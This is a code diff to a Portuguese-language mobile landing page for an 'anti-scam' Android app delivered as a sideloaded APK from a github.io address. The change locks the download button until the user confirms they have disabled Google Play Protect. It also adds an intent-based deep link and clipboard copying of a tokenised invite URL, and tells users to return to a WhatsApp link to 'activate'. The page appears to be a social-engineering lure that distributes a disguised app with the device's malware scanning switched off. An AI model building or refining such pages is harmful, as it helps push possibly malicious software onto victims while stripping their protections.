@@ -137,31 +137,78 @@
         display: flex;
       }
       .download-status {
-        background: rgba(22, 163, 74, 0.16);
-        border: 1px solid rgba(74, 222, 128, 0.45);
-        color: #bbf7d0;
+        background: rgba(234, 179, 8, 0.14);
+        border: 1px solid rgba(250, 204, 21, 0.45);
+        color: #fef08a;
         border-radius: 14px;
-        padding: 12px 14px;
+        padding: 13px 14px;
         font-size: 16px;
         font-weight: 700;
         line-height: 1.4;
       }
-      .btn-green {
+      .download-status.started {
+        background: rgba(22, 163, 74, 0.16);
+        border-color: rgba(74, 222, 128, 0.5);
+        color: #bbf7d0;
+      }
+      .play-protect-box {
+        display: flex;
+        align-items: flex-start;
+        gap: 14px;
+        background: #0f172a;
+        border: 2px solid #f59e0b;
+        border-radius: 16px;
+        padding: 16px 14px;
+        text-align: left;
+        cursor: pointer;
+        user-select: none;
+        transition: border-color 0.2s ease, background 0.2s ease;
+      }
+      .play-protect-box.checked {
+        border-color: #4ade80;
+        background: rgba(22, 163, 74, 0.14);
+      }
+      .play-protect-checkbox {
+        flex-shrink: 0;
+        width: 28px;
+        height: 28px;
+        margin: 2px 0 0;
+        accent-color: #22c55e;
+        cursor: pointer;
+      }
+      .play-protect-label {
+        font-size: 17px;
+        font-weight: 700;
+        line-height: 1.4;
+        color: #ffffff;
+      }
+      .btn-download {
         display: block;
         width: 100%;
         padding: 18px 18px;
         border-radius: 16px;
-        background: #16a34a;
-        border: 2px solid #4ade80;
-        color: #ffffff;
+        background: #475569;
+        border: 2px solid #64748b;
+        color: #cbd5e1;
+        font-family: inherit;
         font-weight: 800;
         font-size: 19px;
         text-align: center;
-        text-decoration: none;
         line-height: 1.3;
+        cursor: not-allowed;
+        opacity: 0.78;
+        box-shadow: none;
+        transition: background 0.2s ease, border-color 0.2s ease, color 0.2s ease, opacity 0.2s ease, box-shadow 0.2s ease;
+      }
+      .btn-download.unlocked {
+        background: #16a34a;
+        border: 2px solid #4ade80;
+        color: #ffffff;
+        cursor: pointer;
+        opacity: 1;
         box-shadow: 0 10px 26px rgba(22, 163, 74, 0.4);
       }
-      .btn-green:active {
+      .btn-download.unlocked:active {
         background: #15803d;
         transform: scale(0.99);
       }
@@ -375,18 +422,29 @@
       </section>
 
       <section id="install-panel" class="install-panel" aria-live="polite">
-        <div class="download-status">
-          Seu convite já foi salvo e o download do Guardião Anti-Golpes começou automaticamente!
+        <div id="download-status-box" class="download-status">
+          Seu convite já foi salvo! Antes de baixar, marque a confirmação abaixo para liberar o download.
         </div>
 
-        <a
+        <label id="play-protect-box" class="play-protect-box" for="play-protect-confirm">
+          <input
+            type="checkbox"
+            id="play-protect-confirm"
+            class="play-protect-checkbox"
+          />
+          <span class="play-protect-label">
+            Confirmo que já desativei temporariamente o Play Protect na Play Store (Passo 1)
+          </span>
+        </label>
+
+        <button
+          type="button"
           id="download-apk-btn"
-          class="btn-green"
-          href="https://sutanxaram-stack.github.io/downloads/GuardiaoAntiGolpes.apk"
-          download="GuardiaoAntiGolpes.apk"
+          class="btn-download"
+          disabled
         >
-          Baixar Guardião Anti-Golpes Novamente
-        </a>
+          Baixar Guardião Anti-Golpes
+        </button>
 
         <div class="guide-box">
           <h2 class="guide-title">Como instalar em 3 toques simples:</h2>
@@ -400,13 +458,13 @@
             <li class="tap-item">
               <span class="tap-badge">Toque 2</span>
               <div class="tap-text">
-                Quando aparecer <strong>"Download concluído"</strong> no topo da tela, toque em <strong>"Abrir"</strong>.
+                Quando aparecer <strong>"Download concluído"</strong> no topo da tela, toque em <strong>"Abrir"</strong> e depois em <strong>"Instalar"</strong>.
               </div>
             </li>
             <li class="tap-item">
               <span class="tap-badge">Toque 3</span>
               <div class="tap-text">
-                Toque em <strong>"Instalar"</strong> e depois abra o <strong>Guardião Anti-Golpes</strong>.
+                Ao terminar, toque em <strong>"Concluído"</strong>, volte no WhatsApp e <strong>toque no link azul novamente</strong> para ativar!
               </div>
             </li>
           </ul>
@@ -417,14 +475,51 @@
     <script>
       (function () {
         var APK_URL = "https://sutanxaram-stack.github.io/downloads/GuardiaoAntiGolpes.apk";
-        var fullUrl = window.location.href || "";
-        var qs = window.location.search || "";
-        var appDeepLink = "guardiao://instalar" + qs;
+        var rawUrl = window.location.href || "";
+        var rawSearch = window.location.search || "";
+        var cleanUrlObj = null;
+        var cleanFullUrl = rawUrl;
+        var cleanQs = rawSearch;
+        var hasTriedIntent = false;
+
+        try {
+          cleanUrlObj = new URL(rawUrl);
+          hasTriedIntent = cleanUrlObj.searchParams.get("intent_tried") === "1";
+          cleanUrlObj.searchParams.delete("intent_tried");
+          cleanFullUrl = cleanUrlObj.toString();
+          cleanQs = cleanUrlObj.search || "";
+        } catch (_) {
+          hasTriedIntent = rawUrl.indexOf("intent_tried=1") !== -1;
+          cleanFullUrl = rawUrl.replace(/([?&])intent_tried=1(&|$)/g, function (_m, p1, p2) {
+            return p1 === "?" && p2 === "&" ? "?" : p2 === "&" ? p1 : "";
+          }).replace(/[?&]$/, "");
+          var qIdx = cleanFullUrl.indexOf("?");
+          cleanQs = qIdx >= 0 ? cleanFullUrl.slice(qIdx).split("#")[0] : "";
+        }
+
+        if (hasTriedIntent && window.history && typeof window.history.replaceState === "function") {
+          try {
+            window.history.replaceState({}, "", cleanFullUrl);
+          } catch (_) {}
+        }
+
+        var fallbackSelfUrl = cleanFullUrl + (cleanFullUrl.indexOf("?") >= 0 ? "&" : "?") + "intent_tried=1";
+        var appDeepLink = "guardiao://instalar" + cleanQs;
+        var androidIntentUrl =
+          "intent://instalar" +
+          cleanQs +
+          "#Intent;scheme=guardiao;package=com.guardiao.antigolpes;S.browser_fallback_url=" +
+          encodeURIComponent(fallbackSelfUrl) +
+          ";end";
+        var isAndroidUa = /Android/i.test(navigator.userAgent || "");
+
         var openingState = document.getElementById("opening-state");
         var installPanel = document.getElementById("install-panel");
         var downloadBtn = document.getElementById("download-apk-btn");
+        var downloadStatusBox = document.getElementById("download-status-box");
+        var playProtectBox = document.getElementById("play-protect-box");
+        var playProtectConfirm = document.getElementById("play-protect-confirm");
         var appOpened = false;
-        var downloadTriggered = false;
 
         function fallbackCopyText(text) {
           try {
@@ -441,24 +536,49 @@
         }
 
         function copyInviteUrlToClipboard() {
-          if (!qs && fullUrl.indexOf("token=") === -1) return;
+          if (!cleanQs && cleanFullUrl.indexOf("token=") === -1) return;
           try {
             if (navigator.clipboard && typeof navigator.clipboard.writeText === "function") {
-              navigator.clipboard.writeText(fullUrl).catch(function () {
-                fallbackCopyText(fullUrl);
+              navigator.clipboard.writeText(cleanFullUrl).catch(function () {
+                fallbackCopyText(cleanFullUrl);
               });
             } else {
-              fallbackCopyText(fullUrl);
+              fallbackCopyText(cleanFullUrl);
             }
           } catch (_) {
-            fallbackCopyText(fullUrl);
+            fallbackCopyText(cleanFullUrl);
           }
         }
 
-        function triggerAutomaticDownload() {
-          if (downloadTriggered) return;
-          downloadTriggered = true;
+        function syncDownloadLockState() {
+          var isConfirmed = Boolean(playProtectConfirm && playProtectConfirm.checked);
+          if (downloadBtn) {
+            downloadBtn.disabled = !isConfirmed;
+            if (isConfirmed) {
+              downloadBtn.classList.add("unlocked");
+            } else {
+              downloadBtn.classList.remove("unlocked");
+            }
+          }
+          if (playProtectBox) {
+            if (isConfirmed) {
+              playProtectBox.classList.add("checked");
+            } else {
+              playProtectBox.classList.remove("checked");
+            }
+          }
+        }
+
+        function startApkDownload() {
+          if (!playProtectConfirm || !playProtectConfirm.checked) {
+            syncDownloadLockState();
+            return;
+          }
           copyInviteUrlToClipboard();
+          if (downloadStatusBox) {
+            downloadStatusBox.classList.add("started");
+            downloadStatusBox.textContent = "Download do Guardião Anti-Golpes iniciado! Siga os 3 toques abaixo.";
+          }
           try {
             var a = document.createElement("a");
             a.href = APK_URL;
@@ -481,11 +601,18 @@
           if (installPanel) {
             installPanel.classList.add("visible");
           }
+          syncDownloadLockState();
         }
+
+        if (playProtectConfirm) {
+          playProtectConfirm.checked = false;
+          playProtectConfirm.addEventListener("change", syncDownloadLockState);
+        }
+        syncDownloadLockState();
 
         if (downloadBtn) {
           downloadBtn.addEventListener("click", function () {
-            copyInviteUrlToClipboard();
+            startApkDownload();
           });
         }
 
@@ -500,15 +627,23 @@
 
         copyInviteUrlToClipboard();
 
+        if (hasTriedIntent) {
+          showInstallGuide();
+          return;
+        }
+
         try {
-          window.location.href = appDeepLink;
-        } catch (_) {}
+          window.location.href = isAndroidUa ? androidIntentUrl : appDeepLink;
+        } catch (_) {
+          try {
+            window.location.href = appDeepLink;
+          } catch (_e) {}
+        }
 
         setTimeout(function () {
           if (!appOpened && !document.hidden) {
             copyInviteUrlToClipboard();
             showInstallGuide();
-            triggerAutomaticDownload();
           }
         }, 1200);
       })();
